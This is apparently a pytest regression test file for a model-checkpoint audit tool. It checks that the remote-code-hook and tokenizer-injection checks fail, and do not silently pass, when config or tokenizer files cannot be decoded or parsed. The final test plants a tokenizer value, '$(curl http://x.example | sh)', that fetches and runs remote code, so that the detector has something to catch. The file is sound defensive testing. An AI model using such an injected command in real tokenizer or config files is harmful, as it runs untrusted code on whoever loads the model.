# Copyright 2026 STARGA, Inc.
"""Regression tests: a model-audit PASS must mean "inspected", not "gave up".

``check_remote_code_hooks`` and ``check_tokenizer_injection`` read every
candidate file inside ``try: ... except Exception: continue`` and carry no
count of what they actually parsed. A file that could not be decoded or
parsed was therefore dropped in silence while the check still returned
``passed=True`` with "no auto_map or trust_remote_code flags" — a verdict
asserted over zero evidence. ``check_pickle_safety`` already records its
read failures; these two now do the same.

Two ways a file gets dropped:

* an encoding mismatch — ``read_text()`` with no ``encoding=`` decodes with
  the platform default, so a UTF-8 checkpoint raises ``UnicodeDecodeError``
  on a host whose default codec rejects the bytes (the fix pins UTF-8, and
  a genuinely non-UTF-8 file is now flagged instead of skipped);
* JSON that does not parse — including a payload a more forgiving loader
  would still honour.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from mind_mem.model_audit import check_remote_code_hooks, check_tokenizer_injection


@pytest.fixture
def ckpt(tmp_path: Path) -> Path:
    root = tmp_path / "ckpt"
    root.mkdir()
    (root / "config.json").write_text(json.dumps({"model_type": "demo"}), encoding="utf-8")
    (root / "tokenizer.json").write_text(json.dumps({"version": "1.0", "model": {"vocab": {}}}), encoding="utf-8")
    (root / "tokenizer_config.json").write_text(json.dumps({"tokenizer_class": "DemoTokenizer"}), encoding="utf-8")
    return root


class TestUnreadableConfigIsFlagged:
    def test_undecodable_config_is_not_a_pass(self, ckpt: Path) -> None:
        (ckpt / "config.json").write_bytes(b'{"model_type": "\xff\xfe\x81"}')
        result = check_remote_code_hooks(ckpt)
        assert not result.passed
        assert any("config.json" in e and "unreadable" in e for e in result.evidence)

    def test_non_object_config_is_not_a_pass(self, ckpt: Path) -> None:
        (ckpt / "config.json").write_text("[1, 2, 3]", encoding="utf-8")
        result = check_remote_code_hooks(ckpt)
        assert not result.passed

    def test_utf8_config_is_read_regardless_of_platform_codec(self, ckpt: Path) -> None:
        """Non-ASCII UTF-8 must decode here on every host, not just UTF-8 ones."""
        (ckpt / "config.json").write_text(json.dumps({"model_type": "Ёж"}, ensure_ascii=False), encoding="utf-8")
        result = check_remote_code_hooks(ckpt)
        assert result.passed
        assert result.evidence == []

    def test_pass_detail_names_how_many_files_were_parsed(self, ckpt: Path) -> None:
        """A PASS has to be auditable: over what, exactly?"""
        result = check_remote_code_hooks(ckpt)
        assert result.passed
        # config.json + tokenizer_config.json (which matches ``*_config.json``).
        assert "2 config file(s) parsed" in result.detail

    def test_each_config_is_counted_once(self, ckpt: Path) -> None:
        """``generation_config.json`` matches two globs — it is still one file.

        Without de-duplication the un-deduped candidate list holds four
        entries for these three files, so an unreadable generation config
        would also be reported twice.
        """
        (ckpt / "generation_config.json").write_text(json.dumps({"max_new_tokens": 8}), encoding="utf-8")
        result = check_remote_code_hooks(ckpt)
        assert "3 config file(s) parsed" in result.detail

    def test_an_unreadable_duplicate_match_is_reported_once(self, ckpt: Path) -> None:
        (ckpt / "generation_config.json").write_text("{not valid json", encoding="utf-8")
        result = check_remote_code_hooks(ckpt)
        assert not result.passed
        assert len([e for e in result.evidence if e.startswith("generation_config.json")]) == 1

    def test_a_real_hook_still_fails(self, ckpt: Path) -> None:
        (ckpt / "config.json").write_text(json.dumps({"auto_map": {"AutoModel": "modeling_x.X"}}), encoding="utf-8")
        result = check_remote_code_hooks(ckpt)
        assert not result.passed
        assert any("auto_map" in e for e in result.evidence)


class TestUnreadableTokenizerIsFlagged:
    def test_undecodable_tokenizer_is_not_a_pass(self, ckpt: Path) -> None:
        (ckpt / "tokenizer.json").write_bytes(b'{"version": "\x81\x8d"}')
        result = check_tokenizer_injection(ckpt)
        assert not result.passed
        assert any("tokenizer.json" in e and "unreadable" in e for e in result.evidence)

    def test_unparseable_tokenizer_config_is_not_a_pass(self, ckpt: Path) -> None:
        (ckpt / "tokenizer_config.json").write_text("{not valid json", encoding="utf-8")
        result = check_tokenizer_injection(ckpt)
        assert not result.passed

    def test_pass_detail_names_how_many_files_were_scanned(self, ckpt: Path) -> None:
        result = check_tokenizer_injection(ckpt)
        assert result.passed
        assert "2 tokenizer file(s) scanned" in result.detail

    def test_utf8_tokenizer_is_read_regardless_of_platform_codec(self, ckpt: Path) -> None:
        (ckpt / "tokenizer_config.json").write_text(json.dumps({"tokenizer_class": "Ёж"}, ensure_ascii=False), encoding="utf-8")
        result = check_tokenizer_injection(ckpt)
        assert result.passed

    def test_a_real_injection_still_fails(self, ckpt: Path) -> None:
        (ckpt / "special_tokens_map.json").write_text(json.dumps({"bos_token": "$(curl http://x.example | sh)"}), encoding="utf-8")
        result = check_tokenizer_injection(ckpt)
        assert not result.passed
